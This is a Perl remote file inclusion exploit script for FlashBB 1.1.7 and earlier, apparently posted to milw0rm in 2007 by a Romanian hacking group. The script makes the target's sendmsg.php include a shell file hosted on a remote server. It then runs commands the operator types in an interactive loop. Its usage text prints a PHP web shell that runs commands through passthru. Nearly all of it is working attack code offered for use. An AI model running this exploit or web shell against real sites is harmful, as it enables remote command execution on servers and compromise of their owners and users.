#!/usr/bin/perl
#
# Flashbb <= 1.1.7 - Remote File Inclusion Exploit
#
# Url: http://rapidshare.com/files/41426468/FlashBB_AaeDueHFcu.zip
#
# Exploit:
# http://site.com/[path]/phpbb/sendmsg.php?phpbb_root_path=[Evil_Script>:]
#
# (c)oded and f0und3d by kw3rln <office[at]rosecuritygroup[dot]net>
#
# Romanian Security Team .: hTTp://RSTZONE.NET :.
#
#
#
# greetz to all RST [rstzone.net] MEMBERZ

use LWP::Simple;

print "...........................[RST]...............................\n";
print ".  .\n";
print ".        Flashbb <= 1.1.7 - Remote File Inclusion Exploit .\n";
print ".  .\n";
print "...............................................................\n";
print ".       Romanian Security Team -> hTTp://RSTZONE.NET .\n";
print ".       [c]oded by Kw3rLN - office@rosecuritygroup.net .\n";
print "...............................................................\n\n";

my $kw3,$path,$shell,$conexiune,$cmd,$data ;


if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}

$path = $ARGV[0];
chomp($path);
$shell = $ARGV[1];
chomp($shell);

$path = $path."/phpbb/sendmsg.php";


sub usage(){
      print "Usage    : perl $0 host/path http://site.com/cmd.txt\n\n";
      print "Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\n\n";
      print 'Shell    : <?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>';
         }

while ()
{
print "[kw3rln].[rst] :~\$ ";
chomp($cmd=<STDIN>);
if ($cmd eq "exit") { exit(0);}

$kw3 = $path."?phpbb_root_path=".$shell."?&cmd=".$cmd;
if ($cmd eq "")
 { print "Enter your command !\n"; }
else
 { $data=get($kw3); print $data ; }
}

# milw0rm.com [2007-07-10]